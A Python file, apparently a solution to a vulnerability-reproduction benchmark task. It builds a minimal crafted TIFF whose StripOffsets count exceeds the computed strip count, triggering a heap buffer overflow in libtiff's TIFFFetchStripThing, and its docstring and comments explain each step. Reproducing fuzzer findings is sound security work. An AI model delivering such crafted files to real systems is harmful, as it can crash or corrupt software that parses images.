import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for oss-fuzz:388571282, a heap buffer overflow in libtiff.

        The vulnerability exists in the `TIFFFetchStripThing` function. This function
        is responsible for reading strip-related tag data, such as `StripOffsets`
        and `StripByteCounts`. The vulnerability occurs because the function allocates
        a buffer based on the number of strips in the image (`nstrips`), but it
        copies data into this buffer based on the tag's own count field (`tdir_count`).

        If a TIFF file is crafted such that `tdir_count` is greater than `nstrips`,
        a heap buffer overflow occurs during the `_TIFFmemcpy` operation.

        This PoC constructs a minimal TIFF file to trigger this condition:
        1.  It sets `ImageLength = 1` and `RowsPerStrip = 1`. This combination
            causes the library to calculate `nstrips = 1`.
        2.  It includes a `StripOffsets` tag where the count field (`tdir_count`)
            is set to 2.
        3.  When `TIFFFetchStripThing` is called for the `StripOffsets` tag, the
            condition `tdir_count > nstrips` (2 > 1) is met.
        4.  The function allocates a buffer for 1 `uint32_t` (4 bytes, based on
            `nstrips`), but then attempts to copy `2 * sizeof(uint32_t)` (8 bytes,
            based on `tdir_count`) into it, resulting in a 4-byte overflow.
        5.  The offset for the `StripOffsets` data is set to 0, which aligns with
            the vulnerability description's hint and causes the read to start from
            the beginning of the file (the TIFF header).
        """
        # TIFF Header (8 bytes)
        # 'II' for Little Endian byte order
        # 42 for TIFF version
        # 8 for the offset to the first Image File Directory (IFD)
        header = b'II\x2a\x00\x08\x00\x00\x00'

        # IFD (Image File Directory)
        # The IFD starts with a 2-byte count of the directory entries.
        # We need 3 entries to set up the vulnerability.
        ifd_count = struct.pack('<H', 3)

        # Tag Entry 1: ImageLength (Tag ID 257)
        # Type: LONG (4), Count: 1, Value: 1
        # This value is used to calculate the number of strips.
        tag_image_length = struct.pack('<HHII', 257, 4, 1, 1)

        # Tag Entry 2: RowsPerStrip (Tag ID 278)
        # Type: LONG (4), Count: 1, Value: 1
        # Combined with ImageLength=1, this forces nstrips to be calculated as 1.
        tag_rows_per_strip = struct.pack('<HHII', 278, 4, 1, 1)

        # Tag Entry 3: StripOffsets (Tag ID 273) - The malicious tag
        # Type: LONG (4)
        # Count: 2. This is the crucial `tdir_count` that is larger than `nstrips`.
        # Offset: 0. The data is read from the beginning of the file.
        tag_strip_offsets = struct.pack('<HHII', 273, 4, 2, 0)

        # Concatenate the IFD entries.
        ifd_entries = tag_image_length + tag_rows_per_strip + tag_strip_offsets

        # The IFD ends with a 4-byte offset to the next IFD. 0 means this is the last one.
        next_ifd_offset = struct.pack('<I', 0)

        # Assemble the final PoC by concatenating all parts.
        poc = header + ifd_count + ifd_entries + next_ifd_offset

        return poc